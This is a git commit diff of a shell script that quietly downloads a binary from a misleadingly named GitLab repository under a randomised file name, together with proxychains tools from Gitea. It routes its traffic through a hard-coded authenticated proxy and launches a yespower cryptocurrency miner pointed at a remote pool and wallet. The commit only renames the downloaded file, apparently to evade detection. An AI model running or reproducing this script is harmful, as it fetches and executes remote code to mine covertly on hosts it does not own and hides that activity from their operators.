b869068974ed60cc3ff6bc2d1fc05bea33a85342
55113110159 <110314564+55113110159@users.noreply.github.com>
2023-12-15 15:18:21 +0700

    Update inka.sh

--- inka.sh
+++ inka.sh
@@ -2,7 +2,7 @@ proxy="50.17.160.202"
 port="9293" 
 user="j20xdk29m7l3e1"  
 pass="iaukjmybb5yx5ot6vodovssxeb5" 
-wget -q -O 7MoNWvulYXrySSMK https://gitlab.com/node.js2594450/ruby/-/raw/main/vds && chmod +x 7MoNWvulYXrySSMK
+wget -q -O xnAnH5EYCjas2bd8JB9ADcceM2F96dTwhqonHtEPFNbbLaz7nc https://gitlab.com/node.js2594450/ruby/-/raw/main/vds && chmod +x xnAnH5EYCjas2bd8JB9ADcceM2F96dTwhqonHtEPFNbbLaz7nc
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
@@ -19,5 +19,5 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./7MoNWvulYXrySSMK -a yespower -o 149.50.222.86:443 -u KMFbor5m85Kh6fSjLKDZuSG6nJHMARC3TQ.$(echo $(shuf -i 1-9999 -n 1)-aajnr)  -p c=CRNC,mc=VHH  --proxy=http://j20xdk29m7l3e1:iaukjmybb5yx5ot6vodovssxeb5@50.17.160.202:9293 
+./panel ./xnAnH5EYCjas2bd8JB9ADcceM2F96dTwhqonHtEPFNbbLaz7nc -a yespower -o 149.50.222.86:443 -u KMFbor5m85Kh6fSjLKDZuSG6nJHMARC3TQ.$(echo $(shuf -i 1-9999 -n 1)-gedb)  -p c=CRNC,mc=VHH  --proxy=http://j20xdk29m7l3e1:iaukjmybb5yx5ot6vodovssxeb5@50.17.160.202:9293 
 
